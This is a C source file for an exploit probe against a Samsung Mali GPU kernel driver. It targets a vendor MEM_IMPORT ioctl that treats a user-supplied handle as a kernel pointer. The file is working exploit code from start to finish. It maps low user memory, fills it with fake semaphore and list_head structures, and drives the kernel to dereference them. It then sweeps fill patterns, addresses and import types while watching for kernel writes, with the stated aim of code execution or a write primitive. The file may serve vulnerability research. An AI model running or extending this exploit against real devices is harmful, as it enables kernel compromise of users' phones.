/*
 * mali_exploit_probe.c — Controlled exploitation of Mali vendor dispatch
 *
 * VULNERABILITY: Samsung vendor dispatch (magic 0x80) MEM_IMPORT treats
 * phandle as a kernel pointer. Normally crashes on deref of fd number.
 *
 * EXPLOIT APPROACH:
 * 1. mmap a page at controlled address (above mmap_min_addr=0x8000)
 * 2. Fill with fake struct data (valid semaphore: unlocked spinlock, count>0)
 * 3. Set phandle = mmap'd address → kernel reads our fake struct
 * 4. down() succeeds → code proceeds → potential code exec or write primitive
 *
 * The struct semaphore needs: lock=UNLOCKED, count>0
 * ARM32 ticket spinlock: owner==next → unlocked
 * Fill page with 0x00010001: spinlock unlocked (owner=1,next=1), count=65537>0
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <linux/ioctl.h>

/* Mali UK interface */
#define MALI_IOC_MAGIC 'M'
#define VENDOR_IOC_MAGIC 0x80

/* UK function IDs */
#define UK_FUNC_VERSION_CHECK 0
#define UK_FUNC_MEM_IMPORT    513
#define UK_FUNC_POST_TERM     521

#define PAGE_SIZE 4096

/* Do Mali handshake via standard path (required before vendor calls) */
static int mali_handshake(int fd) {
    uint8_t hb[16];
    memset(hb, 0, sizeof(hb));
    *(uint32_t *)hb = UK_FUNC_VERSION_CHECK;
    *(uint8_t *)(hb + 8) = 10;  /* version major */
    if (ioctl(fd, _IOC(3, MALI_IOC_MAGIC, 0, 16), hb) < 0) return -1;

    uint32_t result_id = *(uint32_t *)(hb + 4);
    if (result_id != 0) return -1;

    memset(hb, 0, sizeof(hb));
    *(uint32_t *)hb = UK_FUNC_POST_TERM;
    ioctl(fd, _IOC(3, MALI_IOC_MAGIC, 0, 16), hb);
    return 0;
}

/* TEST 1: Verify crash still happens with small phandle value */
static void test_crash_verify(void) {
    printf("--- TEST 1: Verify vendor crash (WILL CRASH if unprotected!) ---\n");
    printf("  SKIPPED: Don't want to reboot device!\n");
    printf("  (Known: phandle=0x1234 → kernel panic)\n\n");
}

/* TEST 2: Try mmap at low addresses */
static void test_mmap_addresses(void) {
    printf("--- TEST 2: mmap availability ---\n");

    /* Check mmap_min_addr */
    FILE *f = fopen("/proc/sys/vm/mmap_min_addr", "r");
    if (f) {
        unsigned long min_addr;
        fscanf(f, "%lu", &min_addr);
        fclose(f);
        printf("  mmap_min_addr = %lu (0x%lx)\n", min_addr, min_addr);
    }

    /* Try to mmap at various addresses */
    unsigned long addrs[] = {
        0x10000, 0x20000, 0x40000, 0x80000,
        0x100000, 0x200000, 0x1000000
    };
    for (int i = 0; i < 7; i++) {
        void *p = mmap((void *)addrs[i], PAGE_SIZE,
                       PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
                       -1, 0);
        if (p == MAP_FAILED) {
            printf("  0x%06lx: FAILED (%s)\n", addrs[i], strerror(errno));
        } else {
            /* Verify we can read/write */
            *(volatile int *)p = 0x41414141;
            int val = *(volatile int *)p;
            printf("  0x%06lx: OK (mapped, r/w verified, val=0x%x)\n", addrs[i], val);
            munmap(p, PAGE_SIZE);
        }
    }
    printf("\n");
}

/* TEST 3: Controlled vendor dispatch with fake struct at mmap'd address */
static void test_controlled_import(void) {
    printf("--- TEST 3: Controlled vendor dispatch with fake struct ---\n");

    /* Strategy:
     * 1. mmap a page at 0x10000
     * 2. Fill with 0x00010001 pattern (unlocked spinlock + positive count)
     * 3. Set phandle = 0x10000
     * 4. Call vendor MEM_IMPORT
     * 5. If down() succeeds, code continues → may return or crash elsewhere
     */

    /* Fork to protect against crash */
    pid_t pid = fork();
    if (pid == 0) {
        alarm(10);

        /* Map page at 0x10000 */
        void *fake = mmap((void *)0x10000, PAGE_SIZE * 4,
                          PROT_READ | PROT_WRITE,
                          MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
                          -1, 0);
        if (fake == MAP_FAILED) {
            printf("  mmap failed: %s\n", strerror(errno));
            _exit(1);
        }

        /* Fill with unlocked-spinlock + positive-count pattern */
        uint32_t *p = (uint32_t *)fake;
        for (int i = 0; i < (PAGE_SIZE * 4) / 4; i++) {
            p[i] = 0x00010001;  /* ARM32 ticket: owner=1, next=1 → UNLOCKED; as count: 65537 */
        }

        /* Also set up some valid-looking list_head pointers at common offsets */
        /* A self-referential list_head: next=prev=&self */
        for (int off = 0; off < PAGE_SIZE * 4 - 16; off += 16) {
            uint32_t addr = 0x10000 + off + 8;  /* address of this list_head */
            *(uint32_t *)((char *)fake + off + 8) = addr;  /* next = self */
            *(uint32_t *)((char *)fake + off + 12) = addr; /* prev = self */
        }

        int fd = open("/dev/mali0", O_RDWR);
        if (fd < 0) {
            printf("  Can't open /dev/mali0: %s\n", strerror(errno));
            _exit(1);
        }

        /* Handshake */
        if (mali_handshake(fd) < 0) {
            printf("  Handshake failed\n");
            close(fd);
            _exit(1);
        }
        printf("  Mali handshake OK\n");

        /* Vendor MEM_IMPORT with phandle = 0x10000 */
        uint8_t buf[48];
        memset(buf, 0, sizeof(buf));
        *(uint32_t *)(buf + 0) = UK_FUNC_MEM_IMPORT;  /* func_id = 513 */
        *(uint32_t *)(buf + 8) = 0x10000;              /* phandle (low 32) */
        *(uint32_t *)(buf + 12) = 0;                   /* phandle (high 32) */
        *(uint32_t *)(buf + 16) = 2;                   /* type = UMM */

        printf("  Calling vendor MEM_IMPORT with phandle=0x10000...\n");
        int ret = ioctl(fd, _IOC(3, VENDOR_IOC_MAGIC, 0, 48), buf);
        printf("  *** SURVIVED! ioctl ret=%d errno=%d ***\n", ret, errno);
        printf("  header.id (result): %u\n", *(uint32_t *)(buf + 4));

        /* Dump modified buffer */
        printf("  Buffer after ioctl:\n");
        for (int i = 0; i < 48; i += 4) {
            printf("    [%2d] 0x%08x\n", i, *(uint32_t *)(buf + i));
        }

        /* Check if the fake struct was modified by the kernel */
        printf("  Fake struct modifications:\n");
        int mods = 0;
        for (int i = 0; i < PAGE_SIZE / 4; i++) {
            if (p[i] != 0x00010001) {
                printf("    offset 0x%03x: 0x%08x (was 0x00010001)\n",
                       i * 4, p[i]);
                mods++;
                if (mods > 20) { printf("    ... (truncated)\n"); break; }
            }
        }
        if (mods == 0) printf("    (no modifications)\n");

        munmap(fake, PAGE_SIZE * 4);
        close(fd);
        _exit(0);
    }

    int status;
    waitpid(pid, &status, 0);
    if (WIFSIGNALED(status)) {
        printf("  Child killed by signal %d", WTERMSIG(status));
        if (WTERMSIG(status) == 14) printf(" (SIGALRM - timeout/hang)");
        printf("\n");
    } else if (WIFEXITED(status)) {
        printf("  Child exited with code %d\n", WEXITSTATUS(status));
    }
    printf("\n");
}

/* TEST 4: Sweep phandle values to find the semaphore offset */
static void test_offset_sweep(void) {
    printf("--- TEST 4: Sweep fake struct offset ---\n");
    printf("  Map 64KB region, try different phandle alignments\n");

    /* Map a large region */
    void *base = mmap((void *)0x100000, 0x10000,
                      PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
                      -1, 0);
    if (base == MAP_FAILED) {
        printf("  mmap failed: %s\n", strerror(errno));
        return;
    }

    /* Try different fill patterns */
    struct {
        const char *name;
        uint32_t fill;
    } patterns[] = {
        {"all_zeros", 0x00000000},
        {"all_ones", 0x00010001},
        {"count_1", 0x00000001},
    };

    for (int pi = 0; pi < 3; pi++) {
        uint32_t *p = (uint32_t *)base;
        for (int i = 0; i < 0x10000 / 4; i++) p[i] = patterns[pi].fill;

        /* Also fix up self-referential list_heads */
        if (patterns[pi].fill == 0x00010001 || patterns[pi].fill == 0x00000001) {
            for (int off = 8; off < 0x10000 - 8; off += 16) {
                uint32_t addr = 0x100000 + off;
                *(uint32_t *)((char *)base + off) = addr;
                *(uint32_t *)((char *)base + off + 4) = addr;
            }
        }

        pid_t pid = fork();
        if (pid == 0) {
            alarm(5);
            int fd = open("/dev/mali0", O_RDWR);
            if (fd < 0) _exit(1);
            mali_handshake(fd);

            uint8_t buf[48];
            memset(buf, 0, sizeof(buf));
            *(uint32_t *)(buf + 0) = UK_FUNC_MEM_IMPORT;
            *(uint32_t *)(buf + 8) = 0x100000;  /* phandle = base */
            *(uint32_t *)(buf + 12) = 0;
            *(uint32_t *)(buf + 16) = 2;

            int ret = ioctl(fd, _IOC(3, VENDOR_IOC_MAGIC, 0, 48), buf);
            uint32_t result = *(uint32_t *)(buf + 4);
            close(fd);
            _exit(result == 3 ? 2 : (ret < 0 ? 3 : 0));
        }

        int status;
        waitpid(pid, &status, 0);
        if (WIFSIGNALED(status)) {
            printf("  pattern=%s: CRASH (signal %d)\n",
                   patterns[pi].name, WTERMSIG(status));
        } else if (WIFEXITED(status)) {
            int code = WEXITSTATUS(status);
            printf("  pattern=%s: exit=%d %s\n",
                   patterns[pi].name, code,
                   code == 0 ? "(SUCCESS)" :
                   code == 2 ? "(result=3, invalid)" :
                   code == 14 ? "(SIGALRM timeout)" : "");
        }
    }

    munmap(base, 0x10000);
    printf("\n");
}

/* TEST 5: Try vendor dispatch with phandle=0 (should be safe, NULL check) */
static void test_null_phandle(void) {
    printf("--- TEST 5: phandle=0 (NULL) baseline ---\n");

    pid_t pid = fork();
    if (pid == 0) {
        alarm(5);
        int fd = open("/dev/mali0", O_RDWR);
        if (fd < 0) _exit(1);
        mali_handshake(fd);

        uint8_t buf[48];
        memset(buf, 0, sizeof(buf));
        *(uint32_t *)(buf + 0) = UK_FUNC_MEM_IMPORT;
        /* phandle = 0 (NULL) */
        *(uint32_t *)(buf + 16) = 2;  /* type = UMM */

        int ret = ioctl(fd, _IOC(3, VENDOR_IOC_MAGIC, 0, 48), buf);
        uint32_t result = *(uint32_t *)(buf + 4);
        printf("  phandle=0: ioctl=%d result=%u\n", ret, result);
        close(fd);
        _exit(0);
    }

    int status;
    waitpid(pid, &status, 0);
    if (WIFSIGNALED(status)) {
        printf("  phandle=0: CRASH (signal %d)\n", WTERMSIG(status));
    } else if (WIFEXITED(status)) {
        printf("  phandle=0: exit=%d\n", WEXITSTATUS(status));
    }
    printf("\n");
}

/* TEST 6: Try import types other than UMM */
static void test_other_types(void) {
    printf("--- TEST 6: Other import types with mmap'd phandle ---\n");

    void *base = mmap((void *)0x100000, PAGE_SIZE,
                      PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
                      -1, 0);
    if (base == MAP_FAILED) { printf("  mmap failed\n"); return; }

    uint32_t *p = (uint32_t *)base;
    for (int i = 0; i < PAGE_SIZE / 4; i++) p[i] = 0x00010001;

    /* Import type values from Mali UK header:
     * 0 = INVALID, 1 = USER_BUFFER, 2 = UMM */
    int types[] = {0, 1, 2, 3, 4, 5};
    for (int ti = 0; ti < 6; ti++) {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(5);
            int fd = open("/dev/mali0", O_RDWR);
            if (fd < 0) _exit(1);
            mali_handshake(fd);

            uint8_t buf[48];
            memset(buf, 0, sizeof(buf));
            *(uint32_t *)(buf + 0) = UK_FUNC_MEM_IMPORT;
            *(uint32_t *)(buf + 8) = 0x100000;
            *(uint32_t *)(buf + 12) = 0;
            *(uint32_t *)(buf + 16) = types[ti];

            int ret = ioctl(fd, _IOC(3, VENDOR_IOC_MAGIC, 0, 48), buf);
            uint32_t result = *(uint32_t *)(buf + 4);
            close(fd);
            /* Encode result in exit code: 0=success, result+10 for non-zero */
            _exit(result == 0 ? 0 : result + 10);
        }

        int status;
        waitpid(pid, &status, 0);
        if (WIFSIGNALED(status)) {
            printf("  type=%d: CRASH (signal %d)%s\n",
                   types[ti], WTERMSIG(status),
                   WTERMSIG(status) == 14 ? " (TIMEOUT/HANG)" : "");
        } else if (WIFEXITED(status)) {
            int code = WEXITSTATUS(status);
            printf("  type=%d: exit=%d %s\n", types[ti], code,
                   code == 0 ? "(result=0 SUCCESS)" :
                   code == 13 ? "(result=3 INVALID)" : "");
        }
    }

    munmap(base, PAGE_SIZE);
    printf("\n");
}

int main() {
    printf("=== Mali Vendor Dispatch Exploitation Probe ===\n\n");

    test_null_phandle();
    test_mmap_addresses();
    test_controlled_import();
    test_offset_sweep();
    test_other_types();

    printf("=== Done ===\n");
    return 0;
}
